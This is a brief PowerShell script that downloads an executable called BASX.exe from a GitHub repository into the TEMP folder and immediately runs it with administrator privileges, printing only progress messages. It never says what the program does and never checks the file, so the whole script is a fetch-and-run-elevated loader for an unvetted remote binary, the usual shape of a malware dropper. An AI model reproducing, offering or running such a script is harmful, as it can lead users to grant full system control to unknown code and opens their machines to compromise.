Write-Host "BASX" -ForegroundColor White

$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"

$output = "$env:TEMP\BASX_Panel.exe"

Write-Host "[*] Downloading BASX System..." -ForegroundColor Yellow

Invoke-WebRequest -Uri $url -OutFile $output

Write-Host "[+] Download Success!" -ForegroundColor Green
Write-Host "[*] Requesting Administrator Privileges..." -ForegroundColor Yellow

Start-Process -FilePath $output -Verb RunAs
